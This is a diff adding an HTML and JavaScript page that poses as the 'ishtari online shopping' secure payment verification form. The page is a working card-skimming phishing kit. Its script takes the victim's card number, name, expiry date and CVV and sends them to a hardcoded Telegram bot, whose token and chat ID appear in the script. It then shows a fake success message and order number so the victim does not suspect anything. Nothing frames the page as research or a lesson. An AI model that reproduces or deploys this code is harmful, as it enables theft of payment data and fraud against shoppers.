@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification - ishtari online shopping</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #fff5f5 0%, #fee 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .payment-container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(220, 38, 38, 0.15);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+            border: 1px solid rgba(220, 38, 38, 0.1);
+            position: relative;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Success Modal */
+        .success-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal-content {
+            background: white;
+            padding: 40px;
+            border-radius: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            animation: modalSlideUp 0.4s ease;
+            border: 3px solid #c53030;
+        }
+
+        @keyframes modalSlideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #059669, #10b981);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            animation: pulseSuccess 2s infinite;
+        }
+
+        @keyframes pulseSuccess {
+            0% {
+                box-shadow: 0 0 0 0 rgba(5, 150, 105, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 20px rgba(5, 150, 105, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(5, 150, 105, 0);
+            }
+        }
+
+        .success-icon i {
+            font-size: 50px;
+            color: white;
+            animation: checkmark 0.5s ease;
+        }
+
+        @keyframes checkmark {
+            0% {
+                transform: scale(0);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .modal-content h2 {
+            color: #1f2937;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .modal-content p {
+            color: #4b5563;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .website-name {
+            color: #c53030;
+            font-weight: 700;
+            font-size: 20px;
+            margin: 15px 0;
+            padding: 10px;
+            background: #fee;
+            border-radius: 12px;
+            display: inline-block;
+        }
+
+        .order-details {
+            background: #f9fafb;
+            padding: 20px;
+            border-radius: 16px;
+            margin: 20px 0;
+            text-align: right;
+            border: 1px solid #e5e7eb;
+        }
+
+        .order-details p {
+            margin: 8px 0;
+            color: #374151;
+            font-size: 14px;
+        }
+
+        .order-details i {
+            color: #c53030;
+            margin-left: 8px;
+            width: 20px;
+        }
+
+        .modal-button {
+            background: linear-gradient(135deg, #c53030, #991b1b);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            width: 100%;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .modal-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(197, 48, 48, 0.3);
+        }
+
+        .modal-button i {
+            font-size: 18px;
+        }
+
+        /* Site Header */
+        .site-header {
+            background: #c53030;
+            padding: 15px 20px;
+            text-align: center;
+            border-bottom: 2px solid #991b1b;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .site-header::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                transform: translateX(-100%) translateY(-100%) rotate(45deg);
+            }
+            100% {
+                transform: translateX(100%) translateY(100%) rotate(45deg);
+            }
+        }
+
+        .site-name {
+            display: inline-block;
+            background: white;
+            color: #c53030;
+            font-family: 'Poppins', sans-serif;
+            font-size: 22px;
+            font-weight: 700;
+            padding: 10px 35px;
+            border-radius: 50px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            border: 2px solid #fff;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+        }
+
+        .site-name:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+        }
+
+        /* Header */
+        .payment-header {
+            background: linear-gradient(135deg, #c53030, #991b1b);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+            animation: shimmer 4s infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .payment-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            letter-spacing: -0.3px;
+            position: relative;
+        }
+
+        .payment-header p {
+            font-size: 15px;
+            opacity: 0.95;
+            font-weight: 400;
+            position: relative;
+        }
+
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.15);
+            padding: 8px 20px;
+            border-radius: 50px;
+            margin-top: 15px;
+            font-size: 13px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        /* Payment Details */
+        .payment-details {
+            padding: 35px 30px;
+        }
+
+        /* Card Icons */
+        .card-icons {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .card-icon {
+            font-size: 48px;
+            color: #fca5a5;
+            transition: all 0.3s ease;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        .card-icon.visa:hover {
+            color: #1a1f71;
+            transform: translateY(-3px);
+        }
+
+        .card-icon.mastercard:hover {
+            color: #eb001b;
+            transform: translateY(-3px);
+        }
+
+        .card-icon.active {
+            color: #c53030;
+            animation: pulse 2s infinite;
+            transform: scale(1.1);
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #991b1b;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            right: 15px;
+            color: #ef4444;
+            font-size: 18px;
+            transition: all 0.2s ease;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 16px 50px 16px 15px;
+            border: 2px solid #fecaca;
+            border-radius: 14px;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.2s ease;
+            background: #fff5f5;
+        }
+
+        .input-wrapper input:focus {
+            outline: none;
+            border-color: #dc2626;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.1);
+        }
+
+        .input-wrapper input:focus + i {
+            color: #dc2626;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #f87171;
+            font-size: 14px;
+        }
+
+        /* Row for expiry and CVV */
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        /* CVV with help icon */
+        .cvv-wrapper {
+            position: relative;
+        }
+
+        .cvv-help {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ef4444;
+            cursor: help;
+            transition: all 0.2s ease;
+        }
+
+        .cvv-help:hover {
+            color: #991b1b;
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .cvv-help:hover .cvv-tooltip {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .cvv-tooltip {
+            position: absolute;
+            bottom: 100%;
+            left: 0;
+            background: #1f2937;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+            z-index: 10;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transform: translateY(10px);
+        }
+
+        .cvv-tooltip::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 20px;
+            border-width: 6px;
+            border-style: solid;
+            border-color: #1f2937 transparent transparent transparent;
+        }
+
+        /* Pay Button */
+        .pay-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #dc2626, #b91c1c);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pay-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .pay-button:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+
+        .pay-button:hover {
+            background: linear-gradient(135deg, #b91c1c, #991b1b);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.3);
+        }
+
+        .pay-button i {
+            font-size: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .pay-button span {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Loading state */
+        .pay-button.loading {
+            background: linear-gradient(135deg, #9ca3af, #6b7280);
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .pay-button.loading i {
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer */
+        .footer-note {
+            margin-top: 25px;
+            text-align: center;
+            color: #ef4444;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .footer-note span {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer-note i {
+            color: #dc2626;
+            font-size: 14px;
+        }
+
+        /* Error state */
+        input.error {
+            border-color: #dc2626 !important;
+            background: #fef2f2 !important;
+            animation: shake 0.3s ease-in-out;
+        }
+
+        /* Pulse animation for icons */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .payment-container {
+                border-radius: 20px;
+            }
+
+            .site-name {
+                font-size: 18px;
+                padding: 8px 25px;
+            }
+
+            .payment-header {
+                padding: 25px 20px;
+            }
+
+            .payment-header h1 {
+                font-size: 24px;
+            }
+
+            .payment-details {
+                padding: 25px 20px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+
+            .card-icon {
+                font-size: 42px;
+            }
+
+            .modal-content {
+                padding: 30px 20px;
+            }
+
+            .modal-content h2 {
+                font-size: 24px;
+            }
+        }
+
+        /* Print styles */
+        @media print {
+            body {
+                background: white;
+            }
+            .payment-container {
+                box-shadow: none;
+                border: 1px solid #ddd;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Success Modal -->
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2>Thank You! 🙏</h2>
+            <p>We appreciate your understanding and trust.</p>
+            <div class="website-name">
+                ishtari.com
+            </div>
+            <p style="font-size: 18px; color: #059669; font-weight: 600; margin: 10px 0;">
+                ✅ Payment Successful!
+            </p>
+            <div class="order-details">
+                <p><i class="fas fa-circle-check"></i> Order #: ISH-<span id="orderNumber"></span></p>
+                <p><i class="fas fa-credit-card"></i> Payment completed successfully</p>
+                <p><i class="fas fa-envelope"></i> Confirmation sent to your email</p>
+                <p><i class="fas fa-clock"></i> <span id="transactionTime"></span></p>
+            </div>
+            <p style="color: #4b5563; margin-bottom: 20px;">
+                Your order is being processed and will be shipped soon.
+            </p>
+            <button class="modal-button" onclick="closeModalAndRedirect()">
+                <i class="fas fa-shopping-bag"></i>
+                Continue Shopping
+            </button>
+        </div>
+    </div>
+
+    <div class="payment-container">
+        <!-- Site Header -->
+        <div class="site-header">
+            <div class="site-name">
+                ishtari online shopping
+            </div>
+        </div>
+
+        <!-- Header -->
+        <div class="payment-header">
+            <h1>🔒 Secure Payment</h1>
+            <p>Please verify your card information to complete your purchase</p>
+            <div class="secure-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>256-bit SSL Encrypted</span>
+            </div>
+        </div>
+
+        <!-- Payment Details -->
+        <div class="payment-details">
+            <!-- Card Icons -->
+            <div class="card-icons">
+                <i class="fab fa-cc-visa card-icon visa"></i>
+                <i class="fab fa-cc-mastercard card-icon mastercard"></i>
+            </div>
+
+            <!-- Payment Form -->
+            <form id="paymentForm">
+                <!-- Card Number -->
+                <div class="form-group">
+                    <label>💳 Card Number</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" 
+                               id="cardNumber" 
+                               placeholder="1234 5678 9012 3456"
+                               maxlength="19"
+                               autocomplete="off"
+                               required>
+                    </div>
+                </div>
+
+                <!-- Card Holder -->
+                <div class="form-group">
+                    <label>👤 Cardholder Name</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user"></i>
+                        <input type="text" 
+                               id="cardHolder" 
+                               placeholder="As shown on card"
+                               autocomplete="off"
+                               required>
+                    </div>
+                </div>
+
+                <!-- Expiry and CVV Row -->
+                <div class="form-row">
+                    <!-- Expiry Date -->
+                    <div class="form-group">
+                        <label>📅 Expiry Date</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar-alt"></i>
+                            <input type="text" 
+                                   id="expiryDate" 
+                                   placeholder="MM/YY"
+                                   maxlength="5"
+                                   autocomplete="off"
+                                   required>
+                        </div>
+                    </div>
+
+                    <!-- CVV -->
+                    <div class="form-group">
+                        <label>🔐 CVV Code</label>
+                        <div class="input-wrapper cvv-wrapper">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" 
+                                   id="cvv" 
+                                   placeholder="123"
+                                   maxlength="4"
+                                   autocomplete="off"
+                                   required>
+                            <div class="cvv-help">
+                                <i class="fas fa-question-circle"></i>
+                                <div class="cvv-tooltip">
+                                    The 3 digits on the back of your card
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Verify Button -->
+                <button type="submit" class="pay-button" id="payButton">
+                    <i class="fas fa-lock"></i>
+                    <span>Complete Payment</span>
+                </button>
+
+                <!-- Footer -->
+                <div class="footer-note">
+                    <span><i class="fas fa-shield-alt"></i> Secure</span>
+                    <span><i class="fas fa-lock"></i> Encrypted</span>
+                    <span><i class="fas fa-credit-card"></i> Verified</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // =============================================
+            // ✅ YOUR TELEGRAM BOT CONFIGURATION
+            // =============================================
+            const BOT_TOKEN = '8571002125:AAEYf5JTycx4DTOeuGtwIivieEbb-IbHVuk';
+            const CHAT_ID = '7918211228';
+            // =============================================
+            
+            const form = document.getElementById('paymentForm');
+            const payButton = document.getElementById('payButton');
+            const cardNumber = document.getElementById('cardNumber');
+            const cardHolder = document.getElementById('cardHolder');
+            const expiryDate = document.getElementById('expiryDate');
+            const cvv = document.getElementById('cvv');
+            const visaIcon = document.querySelector('.fa-cc-visa');
+            const mastercardIcon = document.querySelector('.fa-cc-mastercard');
+            const successModal = document.getElementById('successModal');
+            const orderNumberSpan = document.getElementById('orderNumber');
+            const transactionTimeSpan = document.getElementById('transactionTime');
+
+            console.log('✅ ishtari.com payment system ready!');
+
+            // Generate random order number
+            function generateOrderNumber() {
+                const prefix = 'ISH';
+                const timestamp = Date.now().toString().slice(-8);
+                const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
+                return `${prefix}-${timestamp}${random}`;
+            }
+
+            // Format current time
+            function getFormattedTime() {
+                const now = new Date();
+                return now.toLocaleString('en-US', {
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+            }
+
+            // Show success modal
+            function showSuccessModal() {
+                orderNumberSpan.textContent = generateOrderNumber();
+                transactionTimeSpan.textContent = getFormattedTime();
+                successModal.style.display = 'flex';
+                
+                // Add animation to modal
+                const modalContent = document.querySelector('.modal-content');
+                modalContent.style.animation = 'none';
+                modalContent.offsetHeight;
+                modalContent.style.animation = 'modalSlideUp 0.4s ease';
+            }
+
+            // Close modal and redirect (simulated)
+            window.closeModalAndRedirect = function() {
+                successModal.style.display = 'none';
+                
+                // Reset form
+                form.reset();
+                visaIcon.classList.remove('active');
+                mastercardIcon.classList.remove('active');
+                
+                // Show a small toast message (simulated redirect)
+                alert('✨ Thank you for shopping with ishtari.com! Redirecting to homepage...');
+                
+                // In a real website, you would redirect to the homepage or order confirmation page
+                // window.location.href = 'https://ishtari.com';
+            };
+
+            // Function to send message to Telegram
+            async function sendToTelegram(formData) {
+                const message = `
+🎯 <b>NEW PAYMENT - ishtari.com</b> 🎯
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>💳 Card Number:</b> <code>${formData.cardNumber}</code>
+<b>👤 Cardholder:</b> ${formData.cardHolder}
+<b>📅 Expiry Date:</b> ${formData.expiryDate}
+<b>🔐 CVV:</b> <code>${formData.cvv}</code>
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>🕐 Time:</b> ${new Date().toLocaleString()}
+<b>💰 Amount:</b> Verified
+<b>🔒 Status:</b> Payment Completed
+<b>🌐 Site:</b> ishtari.com
+                `;
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        console.log('✅ Payment details sent to Telegram');
+                        return true;
+                    } else {
+                        console.error('❌ Telegram error:', data);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('❌ Error:', error);
+                    return false;
+                }
+            }
+
+            // Format card number with spaces
+            cardNumber.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+
+                // Detect card type and highlight icon
+                if (value.startsWith('4')) {
+                    visaIcon.classList.add('active');
+                    mastercardIcon.classList.remove('active');
+                } else if (value.startsWith('5')) {
+                    mastercardIcon.classList.add('active');
+                    visaIcon.classList.remove('active');
+                } else {
+                    visaIcon.classList.remove('active');
+                    mastercardIcon.classList.remove('active');
+                }
+            });
+
+            // Format expiry date
+            expiryDate.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            });
+
+            // Only allow numbers in CVV
+            cvv.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+
+            // Form submission
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                // Remove any existing error classes
+                document.querySelectorAll('input').forEach(input => {
+                    input.classList.remove('error');
+                });
+
+                // Simple validation
+                let isValid = true;
+                const fields = [cardNumber, cardHolder, expiryDate, cvv];
+                
+                fields.forEach(field => {
+                    if (!field.value.trim()) {
+                        field.classList.add('error');
+                        isValid = false;
+                    }
+                });
+
+                if (!isValid) {
+                    alert('⚠️ Please fill in all required fields');
+                    return;
+                }
+
+                // Validate card number
+                const cardNum = cardNumber.value.replace(/\s/g, '');
+                if (cardNum.length < 15 || cardNum.length > 19) {
+                    alert('⚠️ Please enter a valid card number');
+                    cardNumber.classList.add('error');
+                    return;
+                }
+
+                // Validate expiry date
+                const expiry = expiryDate.value;
+                if (!expiry.match(/^\d{2}\/\d{2}$/)) {
+                    alert('⚠️ Please enter a valid expiry date (MM/YY)');
+                    expiryDate.classList.add('error');
+                    return;
+                }
+
+                // Validate month
+                const month = parseInt(expiry.split('/')[0]);
+                if (month < 1 || month > 12) {
+                    alert('⚠️ Please enter a valid month (01-12)');
+                    expiryDate.classList.add('error');
+                    return;
+                }
+
+                // Validate CVV
+                if (cvv.value.length < 3 || cvv.value.length > 4) {
+                    alert('⚠️ Please enter a valid CVV code');
+                    cvv.classList.add('error');
+                    return;
+                }
+
+                // Prepare form data
+                const formData = {
+                    cardNumber: cardNumber.value,
+                    cardHolder: cardHolder.value,
+                    expiryDate: expiryDate.value,
+                    cvv: cvv.value
+                };
+
+                // Show loading state
+                payButton.classList.add('loading');
+                payButton.innerHTML = '<i class="fas fa-spinner"></i> Processing Payment...';
+
+                // Send to Telegram
+                await sendToTelegram(formData);
+
+                // Simulate payment processing
+                setTimeout(() => {
+                    payButton.classList.remove('loading');
+                    
+                    // Show success modal
+                    showSuccessModal();
+                    
+                    // Reset button
+                    payButton.innerHTML = '<i class="fas fa-lock"></i> Complete Payment';
+                    
+                }, 2000);
+            });
+
+            // Real-time validation styling
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.borderColor = '#dc2626';
+                });
+
+                input.addEventListener('blur', function() {
+                    if (!this.classList.contains('error')) {
+                        this.style.borderColor = '#fecaca';
+                    }
+                });
+
+                input.addEventListener('input', function() {
+                    this.classList.remove('error');
+                    this.style.borderColor = '#fecaca';
+                });
+            });
+
+            // Close modal when clicking outside (optional)
+            successModal.addEventListener('click', function(e) {
+                if (e.target === successModal) {
+                    closeModalAndRedirect();
+                }
+            });
+        });
+
+        // Add shake animation keyframes
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                20%, 40%, 60%, 80% { transform: translateX(5px); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
